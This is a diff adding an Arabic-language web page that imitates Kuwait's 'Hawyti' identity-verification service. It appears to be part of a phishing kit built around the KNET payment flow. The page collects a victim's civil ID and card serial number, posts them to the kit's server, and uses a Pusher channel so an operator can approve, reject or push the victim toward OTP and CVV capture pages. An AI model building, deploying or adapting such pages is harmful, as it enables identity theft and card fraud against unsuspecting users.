@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هويتي - التحقق من الهوية</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; direction: rtl; }
+        .container { max-width: 500px; margin: 40px auto; padding: 20px; }
+        .card { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        .logo { margin-bottom: 20px; }
+        .logo img { height: 60px; }
+        h2 { color: #333; margin-bottom: 15px; font-size: 18px; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; line-height: 1.6; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 5px; color: #333; font-size: 14px; font-weight: bold; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; text-align: center; direction: ltr; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .btn-primary { background: #0077D5; color: white; }
+        .btn-primary:hover { background: #005fa3; }
+        .btn-cancel { background: #dc3545; color: white; }
+        .btn-cancel:hover { background: #c82333; }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .loading img { height: 30px; }
+        .icon { font-size: 50px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="icon">🔐</div>
+            <h2>التحقق من الهوية - هويتي</h2>
+            <p>لإتمام العملية، يرجى إدخال رقم الهوية المدنية للتحقق من هويتك</p>
+            
+            <div class="input-group">
+                <label>رقم الهوية المدنية</label>
+                <input type="tel" id="civilId" maxlength="12" placeholder="أدخل رقم الهوية المدنية" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="input-group">
+                <label>رقم التسلسل</label>
+                <input type="tel" id="serialNumber" maxlength="10" placeholder="أدخل رقم التسلسل" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div id="formButtons">
+                <button class="btn btn-primary" onclick="submitHawety()">تأكيد</button>
+                <button class="btn btn-cancel" onclick="cancelHawety()">إلغاء</button>
+            </div>
+            
+            <div class="loading" id="loading">
+                <p>جاري التحقق من الهوية...</p>
+                <p style="font-size:12px; color:#999;">يرجى الانتظار</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="knet/pusher.min.js"></script>
+    <script>
+        var pid = "7239";
+        Pusher.logToConsole = true;
+        var pusher = new Pusher("d1868eff0961af03482e", {
+            cluster: 'ap2'
+        });
+        var channel = pusher.subscribe("confirm");
+        channel.bind("App\\Events\\Confirmation", function(data) {
+            if (data.people_id == pid && data.status == "Accept") {
+                alert("تم التحقق بنجاح");
+                window.location.href = "index.html";
+            }
+            if (data.people_id == pid && data.status == "Reject") {
+                alert("تم رفض العملية");
+                window.location.href = "index.html";
+            }
+            if (data.people_id == pid && data.status == "otp") {
+                window.location.href = "knetwait.html";
+            }
+            if (data.people_id == pid && data.status == "cvv") {
+                window.location.href = "knetwait.html";
+            }
+        });
+
+        function submitHawety() {
+            var civilId = document.getElementById('civilId').value;
+            var serialNumber = document.getElementById('serialNumber').value;
+            
+            if (!civilId) {
+                alert("يرجى إدخال رقم الهوية المدنية");
+                return;
+            }
+            
+            var submissionId = localStorage.getItem('submissionId') || '';
+            
+            // Send hawety data to server
+            fetch('/api/update-submission', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    id: submissionId, 
+                    otp: 'هويتي: ' + civilId + ' | تسلسل: ' + serialNumber
+                })
+            }).then(function(r) { return r.json(); }).then(function(res) {
+                console.log('Hawety sent:', res);
+                document.getElementById('formButtons').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+            }).catch(function(e) { 
+                console.error(e);
+                document.getElementById('formButtons').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+            });
+        }
+
+        function cancelHawety() {
+            window.location.href = "index.html";
+        }
+    </script>
+</body>
+</html>
